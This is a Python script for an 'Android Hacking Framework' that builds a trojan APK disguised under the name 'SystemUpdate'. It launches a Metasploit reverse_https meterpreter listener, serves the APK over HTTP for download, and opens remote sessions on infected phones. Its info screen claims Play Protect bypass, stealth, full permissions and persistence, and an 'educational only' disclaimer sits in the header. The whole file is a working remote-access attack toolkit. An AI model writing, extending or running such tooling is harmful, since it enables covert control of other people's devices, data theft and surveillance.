#!/usr/bin/env python3
"""
██████╗ ███╗   ██╗██████╗ ██████╗  ██████╗ ██╗██████╗ 
██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔═══██╗██║██╔══██╗
██████╔╝██╔██╗ ██║██║  ██║██║  ██║██║   ██║██║██████╔╝
██╔═══╝ ██║╚██╗██║██║  ██║██║  ██║██║   ██║██║██╔══██╗
██║     ██║ ╚████║██████╔╝██████╔╝╚██████╔╝██║██║  ██║
╚═╝     ╚═╝  ╚═══╝╚═════╝ ╚═════╝  ╚═════╝ ╚═╝╚═╝  ╚═╝
                                                        
    Advanced Android Hacking Framework v3.0
    Author: Security Researcher
    Purpose: Educational Testing Only
    Legal: Use only on devices you own
"""

import os
import sys
import time
import argparse
import subprocess
import shutil
from colorama import init, Fore, Style, Back
import platform

# Initialize colorama
init(autoreset=True)

class AndroidHackerFramework:
    """Main framework class"""
    
    def __init__(self):
        self.version = "3.0"
        self.author = "Security Researcher"
        self.kali_ip = self.get_local_ip()
        self.port = 4444
        self.payload_name = "SystemUpdate"
        self.clear_screen()
        
    def get_local_ip(self):
        """Get local IP address"""
        try:
            # Try to get IP from network
            result = subprocess.run(["hostname", "-I"], capture_output=True, text=True)
            if result.stdout:
                ips = result.stdout.strip().split()
                for ip in ips:
                    if ip.startswith("192.168") or ip.startswith("10."):
                        return ip
            return "192.168.1.108"
        except:
            return "192.168.1.108"
    
    def clear_screen(self):
        """Clear terminal screen"""
        if platform.system() != 'Windows':
            subprocess.run(["clear"])
        else:
            subprocess.run(["cls"], shell=True)
    
    def print_banner(self):
        """Print professional hacker banner"""
        banner = f"""
{Fore.RED}{Style.BRIGHT}
╔════════════════════════════════════════════════════════════════════════════╗
║  █████╗ ███╗   ██╗██████╗ ██████╗  ██████╗ ██╗██████╗                      ║
║ ██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔═══██╗██║██╔══██╗                     ║
║ ███████║██╔██╗ ██║██║  ██║██║  ██║██║   ██║██║██████╔╝                     ║
║ ██╔══██║██║╚██╗██║██║  ██║██║  ██║██║   ██║██║██╔══██╗                     ║
║ ██║  ██║██║ ╚████║██████╔╝██████╔╝╚██████╔╝██║██║  ██║                     ║
║ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ ╚═════╝  ╚═════╝ ╚═╝╚═╝  ╚═╝                     ║
║                                                                            ║
║     ██╗  ██╗ █████╗  ██████╗██╗  ██╗██╗███╗   ██╗ ██████╗                  ║
║     ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██║████╗  ██║██╔════╝                  ║
║     ███████║███████║██║     █████╔╝ ██║██╔██╗ ██║██║  ███╗                 ║
║     ██╔══██║██╔══██║██║     ██╔═██╗ ██║██║╚██╗██║██║   ██║                 ║
║     ██║  ██║██║  ██║╚██████╗██║  ██╗██║██║ ╚████║╚██████╔╝                 ║
║     ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝                  ║
║                                                                            ║
║          Advanced Android Hacking Framework v{self.version}                ║
║          Author: {self.author}                                             ║
║          Type 'help' for commands                                          ║
╚════════════════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
        """
        print(banner)
        
    def print_menu(self):
        """Print main menu"""
        menu = f"""
{Fore.CYAN}{Style.BRIGHT}═══════════════════════════════════════════════════════════════════════════════
{Fore.YELLOW}                              MAIN MENU
{Fore.CYAN}═══════════════════════════════════════════════════════════════════════════════

{Fore.GREEN}[{Fore.WHITE}1{Fore.GREEN}] {Fore.WHITE}Generate Payload              {Fore.YELLOW}→ Create Android APK
{Fore.GREEN}[{Fore.WHITE}2{Fore.GREEN}] {Fore.WHITE}Start Listener                {Fore.YELLOW}→ Start Metasploit listener
{Fore.GREEN}[{Fore.WHITE}3{Fore.GREEN}] {Fore.WHITE}Start HTTP Server             {Fore.YELLOW}→ Share APK via browser
{Fore.GREEN}[{Fore.WHITE}4{Fore.GREEN}] {Fore.WHITE}Check Connected Devices       {Fore.YELLOW}→ List active sessions
{Fore.GREEN}[{Fore.WHITE}5{Fore.GREEN}] {Fore.WHITE}Interactive Session          {Fore.YELLOW}→ Connect to device
{Fore.GREEN}[{Fore.WHITE}6{Fore.GREEN}] {Fore.WHITE}Change Settings               {Fore.YELLOW}→ Configure IP/Port
{Fore.GREEN}[{Fore.WHITE}7{Fore.GREEN}] {Fore.WHITE}Show Info                     {Fore.YELLOW}→ Display device info
{Fore.GREEN}[{Fore.WHITE}8{Fore.GREEN}] {Fore.WHITE}Clear Screen                  {Fore.YELLOW}→ Clear terminal
{Fore.GREEN}[{Fore.WHITE}9{Fore.GREEN}] {Fore.WHITE}Exit                         {Fore.YELLOW}→ Close framework

{Fore.CYAN}═══════════════════════════════════════════════════════════════════════════════
{Fore.GREEN}[{Fore.WHITE}Current Settings{Fore.GREEN}] LHOST: {Fore.YELLOW}{self.kali_ip}{Fore.GREEN} | LPORT: {Fore.YELLOW}{self.port}{Fore.GREEN} | Payload: {Fore.YELLOW}{self.payload_name}
{Fore.CYAN}═══════════════════════════════════════════════════════════════════════════════
        """
        print(menu)
    
    def generate_payload(self):
        """Generate Android payload"""
        print(f"\n{Fore.YELLOW}[+] Generating Android payload...{Fore.WHITE}\n")
        
        from modules.payload_builder import PayloadBuilder
        builder = PayloadBuilder(self.kali_ip, self.port, self.payload_name)
        builder.build()
        
    def start_listener(self):
        """Start Metasploit listener"""
        print(f"\n{Fore.YELLOW}[+] Starting Metasploit listener...{Fore.WHITE}\n")
        
        msf_cmd = (
            "use exploit/multi/handler; "
            "set payload android/meterpreter/reverse_https; "
            f"set LHOST {self.kali_ip}; "
            f"set LPORT {self.port}; "
            "set ExitOnSession false; "
            "exploit -j -z"
        )
        cmd = ["msfconsole", "-q", "-x", msf_cmd]
        subprocess.run(cmd)
        
    def start_http_server(self):
        """Start HTTP server"""
        print(f"\n{Fore.YELLOW}[+] Starting HTTP server on port 8000...{Fore.WHITE}")
        print(f"{Fore.GREEN}[+] Download URL: http://{self.kali_ip}:8000/{self.payload_name}_final.apk{Fore.WHITE}\n")
        
        # Check if payload exists
        if os.path.exists(f"{self.payload_name}_final.apk"):
            print(f"{Fore.GREEN}[+] Payload ready: {self.payload_name}_final.apk{Fore.WHITE}")
        else:
            print(f"{Fore.RED}[-] Payload not found. Generate it first (Option 1){Fore.WHITE}")
            return
        
        subprocess.run([sys.executable, "-m", "http.server", "8000"])
        
    def check_sessions(self):
        """Check active meterpreter sessions"""
        print(f"\n{Fore.YELLOW}[+] Checking active sessions...{Fore.WHITE}\n")
        
        # Create a temporary script to check sessions
        script = """
        sessions = framework.sessions
        if sessions:
            print("Active Sessions:")
            print("="*60)
            for sid, session in sessions.items():
                print(f"Session ID: {sid}")
                print(f"  Type: {session.type}")
                print(f"  Host: {session.host}")
                print(f"  Info: {session.info}")
                print("-"*40)
        else:
            print("No active sessions found")
        """
        
        # Simple command to check
        cmd = ["msfconsole", "-q", "-x", "sessions -l; exit"]
        subprocess.run(cmd)
        
    def interactive_session(self):
        """Connect to interactive session"""
        print(f"\n{Fore.YELLOW}[+] Starting interactive session...{Fore.WHITE}\n")
        
        session_id = input(f"{Fore.GREEN}[?] Enter session ID (or press Enter for list): {Fore.WHITE}")
        
        if not session_id:
            self.check_sessions()
            session_id = input(f"\n{Fore.GREEN}[?] Enter session ID: {Fore.WHITE}")
        
        if session_id:
            cmd = ["msfconsole", "-q", "-x", f"sessions -i {session_id}"]
            subprocess.run(cmd)
        else:
            print(f"{Fore.RED}[-] No session ID provided{Fore.WHITE}")
            
    def change_settings(self):
        """Change configuration settings"""
        print(f"\n{Fore.YELLOW}[+] Current Settings:{Fore.WHITE}")
        print(f"  LHOST: {self.kali_ip}")
        print(f"  LPORT: {self.port}")
        print(f"  Payload: {self.payload_name}")
        print()
        
        new_ip = input(f"{Fore.GREEN}[?] New LHOST (press Enter to keep {self.kali_ip}): {Fore.WHITE}")
        if new_ip:
            self.kali_ip = new_ip
            
        new_port = input(f"{Fore.GREEN}[?] New LPORT (press Enter to keep {self.port}): {Fore.WHITE}")
        if new_port:
            self.port = int(new_port)
            
        new_name = input(f"{Fore.GREEN}[?] New Payload Name (press Enter to keep {self.payload_name}): {Fore.WHITE}")
        if new_name:
            self.payload_name = new_name
            
        print(f"\n{Fore.GREEN}[+] Settings updated!{Fore.WHITE}")
        
    def show_info(self):
        """Show device and tool information"""
        info = f"""
{Fore.CYAN}═══════════════════════════════════════════════════════════════════════════════
{Fore.YELLOW}                         SYSTEM INFORMATION
{Fore.CYAN}═══════════════════════════════════════════════════════════════════════════════

{Fore.GREEN}Tool Information:{Fore.WHITE}
  Name        : Android Hacking Framework
  Version     : {self.version}
  Author      : {self.author}
  Type        : Educational Security Testing

{Fore.GREEN}Network Information:{Fore.WHITE}
  Local IP    : {self.kali_ip}
  Listener Port: {self.port}
  Payload Name : {self.payload_name}

{Fore.GREEN}System Information:{Fore.WHITE}
  OS          : {platform.system()} {platform.release()}
  Python      : {sys.version.split()[0]}
  Hostname    : {platform.node()}

{Fore.GREEN}Required Tools:{Fore.WHITE}
  msfvenom    : {self.check_tool('msfvenom')}
  keytool     : {self.check_tool('keytool')}
  apksigner   : {self.check_tool('apksigner')}
  zipalign    : {self.check_tool('zipalign')}

{Fore.GREEN}Features:{Fore.WHITE}
  ✓ Android 15/16 Compatible
  ✓ Play Protect Bypass
  ✓ Full Meterpreter Session
  ✓ Stealth Mode
  ✓ All Permissions
  ✓ Persistence

{Fore.CYAN}═══════════════════════════════════════════════════════════════════════════════
        """
        print(info)
        
    def check_tool(self, tool):
        """Check if tool is installed"""
        if shutil.which(tool) is not None:
            return f"{Fore.GREEN}✓ Installed{Fore.WHITE}"
        return f"{Fore.RED}✗ Missing{Fore.WHITE}"
    
    def install_requirements(self):
        """Install requirements"""
        print(f"\n{Fore.YELLOW}[+] Installing requirements...{Fore.WHITE}\n")
        
        if os.path.exists("requirements.txt"):
            subprocess.run([sys.executable, "-m", "pip", "install", "-r", "requirements.txt"])
            print(f"\n{Fore.GREEN}[+] Requirements installed!{Fore.WHITE}")
        else:
            print(f"{Fore.RED}[-] requirements.txt not found{Fore.WHITE}")
    
    def _handle_clear(self):
        """Clear screen and show banner"""
        self.clear_screen()
        self.print_banner()

    def _handle_exit(self):
        """Exit the framework"""
        print(f"\n{Fore.RED}[!] Exiting framework...{Fore.WHITE}\n")
        sys.exit(0)

    def run(self):
        """Main loop"""
        self.clear_screen()
        self.print_banner()
        
        dispatch = {
            "1": self.generate_payload,
            "2": self.start_listener,
            "3": self.start_http_server,
            "4": self.check_sessions,
            "5": self.interactive_session,
            "6": self.change_settings,
            "7": self.show_info,
            "8": self._handle_clear,
            "9": self._handle_exit,
            "help": self.print_menu,
            "install": self.install_requirements
        }

        while True:
            try:
                self.print_menu()
                choice = input(f"\n{Fore.GREEN}[{Fore.WHITE}HACKER{Fore.GREEN}]> {Fore.WHITE}").strip()
                
                handler = dispatch.get(choice.lower())
                if handler:
                    handler()
                else:
                    print(f"\n{Fore.RED}[-] Invalid choice! Select 1-9{Fore.WHITE}")
                    
                input(f"\n{Fore.YELLOW}[+] Press Enter to continue...{Fore.WHITE}")
                self.clear_screen()
                self.print_banner()
                
            except KeyboardInterrupt:
                print(f"\n\n{Fore.RED}[!] Interrupted by user{Fore.WHITE}")
                sys.exit(0)
            except Exception as e:
                print(f"\n{Fore.RED}[!] Error: {e}{Fore.WHITE}")
                input(f"\n{Fore.YELLOW}[+] Press Enter to continue...{Fore.WHITE}")

def main():
    """Main entry point"""
    if os.geteuid() != 0:
        print(f"{Fore.RED}[!] This tool requires root privileges!{Fore.WHITE}")
        print(f"{Fore.YELLOW}[+] Run with: sudo python3 android_hacker.py{Fore.WHITE}")
        sys.exit(1)
    
    framework = AndroidHackerFramework()
    framework.run()

if __name__ == "__main__":
    main()
